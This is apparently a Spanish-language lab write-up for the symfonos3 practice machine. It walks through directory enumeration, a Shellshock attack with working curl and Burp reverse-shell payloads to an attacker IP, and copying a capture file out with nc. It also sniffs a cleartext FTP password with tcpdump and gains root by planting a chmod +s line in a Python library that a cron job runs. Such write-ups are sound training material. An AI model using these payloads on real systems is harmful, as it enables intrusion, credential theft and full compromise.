PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

-Hacemos enumeración web con gobuster y caemos en una serie de carpetas que no llevan a ningún lado (Rabbit Hole)

-Tenemos que aplicar el parámetro --add-slash en Gobuster para que nos encuentre la siguiente ruta vulnerable, sino no la encuentra:
	-gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.1.130/ -t 100 --add-slash
	-Ruta encontrada --> /cgi-bin/ --> Permission Denied (No nos permite acceder)
	-Seguimos enumerando:
		-gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.1.130/cgi-bin/ -t 100 --add-slash
		-Ruta encontrada --> /underworld --> Si podemos acceder 

-Cuando nos salga la carpeta /cgi-bin/ significa que el servidor está usando una versión de Bash antigua.

-Vamos a la ruta http://192.168.1.130/cgi-bin/underworld/ y confirmamos la vulnerabilidad, sale un 'time script' que corre bajo la carpeta /cgi/bin/:
	05:26:03 up 5 min, 0 users, load average: 0.00, 0.00, 0.00

-Podemos aplicar un '**Shellshock Attack**' , que afecta a la shell de Linux «Bash» hasta la versión 4.3. Esta vulnerabilidad permite **RCE** aplicando una serie de filtros:
	-2 FORMAS:
		1-Con CURL
			-Hacemos la prueba para confirmar que sea vulnerable:
				-curl -s -X GET "http://192.168.1.130/cgi-bin/underworld/"  -H "User-Agent: () { :;}; echo;echo ¿Es vulnerable?"
				¿Es vulnerable?
				Content-type: text/html
				 06:11:07 up 50 min,  0 users,  load average: 0.00, 0.00, 0.00
			-Respuesta del servidor:
					¿Es vulnerable?
					Content-type: text/html
					 06:11:07 up 50 min,  0 users,  load average: 0.00, 0.00, 0.00
				-Nos ha ejecutado el comando, con lo cual es vulnerable y podemos ganar acceso al sistema.
			-Ejecutamos una reverse shell para ganar acceso, para llamar a la bash hay que poner la ruta absoluta:
				-curl -s -X GET "http://192.168.1.130/cgi-bin/underworld/" -H "User-Agent: () 
				{ :;}; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.135/1234 0>&1'"
				-Estamos dentro: cerberus@symfonos3:/usr/lib/cgi-bin$
		2-Con BurpSuite
			-Hacemos la prueba para confirmar que sea vulnerable:
				-GET /cgi-bin/underworld/ HTTP/1.1
				-Host: 192.168.1.130
				-User-Agent: () { :;};echo;echo ¿Es vulnerable?
				-Respuesta del servidor: 
					¿Es vulnerable?
					Content-type: text/html
					 06:45:46 up  1:24,  0 users,  load average: 0.00, 0.00, 0.00
			-Ejecutamos una reverse shell para ganar acceso al sistema:
				-User-Agent: () { :;};/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.135/1234 0>&1'
				-Estamos dentro: cerberus@symfonos3:/usr/lib/cgi-bin$


## Escalada de Privilegios

-Somos el usuario 'cerberus', no podemos ejecutar comando como root ni aprovecharnos de ningún binario SUID.

-Vemos a que grupos pertenece el usuario cerberus, se puede ver de 2 formas:
	1-groups:
		cerberus www-data pcap
	2-id
		uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)
-Vemos sobre que archivos y directorios pertenecen al grupo pcap:
	-find / -group pcap 2>/dev/null
		/usr/sbin/tcpdump
	-ls -la /usr/sbin/tcpdump:
		-rwxr-x--- 1 root pcap 1031784 Oct 19  2019 /usr/sbin/tcpdump
		-El propietario del archivo es root, y nosotros tenemos permisos de lectura y ejecución.

-El binario 'tcpdump' sirve para capturar y analizar paquetes de red en Linux. 

-Si  conseguimos identificar alguna tarea CRON que se esté ejecutando en el sistema y que comparta información sensible por la red, podríamos capturar esta información con 'tcpdump'.

-La herramienta PSPY (de github) , nos permite identificar tareas o comandos que se estén ejecutando en el sistema a intervalos regulares de tiempo.
	-Para descargarla:
		https://github.com/DominicBreuker/pspy/releases
		-Hacemos click en 'pspy64'

-La descargamos al directorio /tmp de la máquina víctima con un servidor en python3 desde nuestra máquina. Depués le damos permisos de ejecución y la ejecutamos:
	-wget http://192.168.1.130/pspy64
	-chmod +x pspy64
	-./pspy64

-Vemos que se está ejecutando cada cierto tiempo la siguiente tarea cron:
	/usr/sbin/CRON -f 
	 UID=0     PID=12821  | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
	 UID=0: Significa que la ejecuta el usuario root.

-No podemos acceder ni ver el contenido de la tarea, ya que solo 'root' o los usuarios del grupo 'hades' pueden:
	-ls -la /opt
		drwxr-x---  2 root hades 4096 Apr  6  2020 ftpclient

-Nos ponemos en escucha con 'tcpdump' por la interfaz 'lo' (Loopback) , ya que se interceptan más paquetes. Vamos a depositar todo lo que capturemos al archivo Captura.cap, para analizarlo desde nuestra máquina local con 'tshark':
	-Capturamos el tráfico por la interfaz 'Loopback' y depositamos los datos capturados en 'Captura.cap':
		-tcpdump -i lo -w Captura.cap -v
	-Nos compartimos el archivo con nuestra máquina local con 'nc' (la máquina no tiene python3 instalado y no podemos iniciar un servidor http):
		-Enviamos el contenido del archivo desde la máquina víctima a nuestra máquina:
			-nc 192.168.1.135 443 < Captura.cap
		-Recibimos el contenido del archivo en nuestra máquina y lo metemos en un archivo Captura.cap:
			-nc -lvnp 443 > Captura.cap
			connect to [192.168.1.135] from (UNKNOWN) [192.168.1.130]

-Utilizamos la herramienta 'tshark' , que es como 'wireshark' pero desde la terminal. Se utiliza para capturar y analizar tráfico de red. En este caso la vamos a utilizar con el parámetro '-r' para analizar el contenido del archivo 'Captura.cap' , filtramos por 'FTP' para ver solo los que interesa:
	-tshark -r Captura.cap | grep FTP
		   16   0.010988    127.0.0.1 → 127.0.0.1    FTP 78 Request: USER hades
		   18   0.011254    127.0.0.1 → 127.0.0.1    FTP 99 Response: 331 Password required for hades
		   19   0.011273    127.0.0.1 → 127.0.0.1    FTP 89 Request: PASS PTpZTfU4vxgzvRBE
		   20   0.017792    127.0.0.1 → 127.0.0.1    FTP 92 Response: 230 User hades logged in

-Parece que el usuario root, a través de la tarea CRON /opt/ftpclient/ftpclient.py se loguea con el usuario Hades y se puede ver su contraseña en texto claro

-Pivotamos al usuario 'Hades' y vemos que podemos hacer:
	su hades
	password: PTpZTfU4vxgzvRBE
	hades@symfonos3:~$ 

-Vemos los grupos a los que pertenece el usuario hades:
	hades@symfonos3:~$ groups
	hades gods

-Vemos que archivos pertenecen al grupo 'hades' y filtramos por 'ftp':
	-find / -group gods 2>/dev/null | grep ftp
		/usr/lib/python2.7/ftplib.py

-Es justo la librería que utiliza el usuario 'root' para ejecutar la 
tarea CRON ' /opt/ftpclient/ftpclient.py '. Miramos los permisos:
	-ls -la  /opt/ftpclient/ftpclient.py:
		rwxrw-r-- 1 root gods 37755 Sep 26  2018 /usr/lib/python2.7/ftplib.py
		-Tenemos permisos de escritura!!

-Modificamos la librería para modificar los permisos de la /bin/bash, cómo la tarea CRON la ejecuta root y usa esta librería, se ejecutará con permisos de root y nos aplicará los cambios:
	-nano /usr/lib/python2.7/ftplib.py
		-Escribimos la siguiente línea:
			os.system("chmod +s /bin/bash")